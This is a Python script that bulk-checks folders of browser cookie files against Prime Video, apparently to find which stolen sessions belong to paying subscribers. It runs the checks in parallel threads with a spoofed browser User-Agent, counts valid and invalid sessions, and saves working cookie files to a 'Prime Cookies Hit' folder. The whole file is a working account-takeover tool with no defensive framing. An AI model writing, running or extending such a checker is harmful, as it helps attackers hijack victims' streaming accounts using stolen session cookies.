import requests
import os
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

def get_highest_file_counter(working_folder):
    if not os.path.exists(working_folder):
        return 0
    max_counter = 0
    for filename in os.listdir(working_folder):
        match = re.search(r'_(\d+)\.txt$', filename)
        if match:
            counter = int(match.group(1))
            max_counter = max(max_counter, counter)
    return max_counter

def load_cookies_from_netscape_file(cookie_file):
    cookies = {}
    try:
        with open(cookie_file, 'r', encoding='utf-8') as file:
            for line in file:
                if not line.startswith('#') and line.strip():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        cookies[parts[5]] = parts[6].strip('"')
    except Exception as e:
        print(f"\nError reading {cookie_file}: {e}")
    return cookies

def check_prime_video(cookies, cookie_file, result_dict, lock, working_folder, file_counter, new_files):
    headers = {
        "Host": "www.primevideo.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Upgrade-Insecure-Requests": "1",
    }

    url = "https://www.primevideo.com/region/eu/storefront"
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        content = response.text

        has_paid_sub = "YES✅" if "\"watchlistAction\":{\"ajaxEnabled\":" in content else "NO❌"

        with lock:
            result_dict['total'] += 1
            if has_paid_sub == "YES✅":
                result_dict['valid'] += 1
            else:
                result_dict['invalid'] += 1

            print(f"\rTotal: {result_dict['total']} | Valid: {result_dict['valid']} | Invalid: {result_dict['invalid']}", end="", flush=True)

        if has_paid_sub == "YES✅":
            os.makedirs(working_folder, exist_ok=True)

            out_filename = f"[HAS PAID SUB-{has_paid_sub}]-PrimeVideo Cookies {file_counter}.txt"
            out_file = os.path.join(working_folder, out_filename)

            with open(out_file, "w", encoding="utf-8") as f_out:
                with open(cookie_file, "r", encoding="utf-8") as f_in:
                    for line in f_in:
                        if not line.startswith('#') and line.strip():
                            parts = line.strip().split('\t')
                            if len(parts) >= 7:
                                f_out.write(line)
            with lock:
                new_files.append(out_file)
            return 1
        return 0

    except Exception as e:
        print(f"\nError checking {cookie_file}: {e}")
        with lock:
            result_dict['total'] += 1
            result_dict['invalid'] += 1
        return 0

def process_folder(input_folder, result_dict, thread_count, new_files):
    if not os.path.exists(input_folder):
        print(f"\nError: Folder '{input_folder}' does not exist.")
        return

    if not os.path.isdir(input_folder):
        print(f"\nError: '{input_folder}' is not a valid folder.")
        return

    txt_files = [os.path.join(input_folder, f) for f in os.listdir(input_folder) if f.lower().endswith(".txt")]

    if not txt_files:
        print(f"\nNo .txt files found in folder '{input_folder}'.")
        return

    working_folder = "Prime Cookies Hit"
    file_counter = get_highest_file_counter(working_folder) + 1

    lock = threading.Lock()
    saved_files = 0

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        for txt_file in txt_files:
            cookies = load_cookies_from_netscape_file(txt_file)
            if cookies:
                futures.append(
                    executor.submit(
                        check_prime_video,
                        cookies, txt_file, result_dict, lock,
                        working_folder, file_counter + saved_files, new_files
                    )
                )
                saved_files += 1

        for future in as_completed(futures):
            saved = future.result()
            if saved:
                saved_files += saved

def main():
    input_folder = input("Enter Folder Name: ").strip().strip('"\'')
    try:
        thread_count = int(input("Enter the number of threads to use: "))
        if thread_count <= 0:
            raise ValueError
    except:
        print("Invalid input. Using default 10 threads.")
        thread_count = 10

    result_dict = {'total': 0, 'valid': 0, 'invalid': 0}
    new_files = []

    print("\nStarting Prime Video cookie check from folder...\n")
    process_folder(input_folder, result_dict, thread_count, new_files)
    print() 

if __name__ == "__main__":
    main()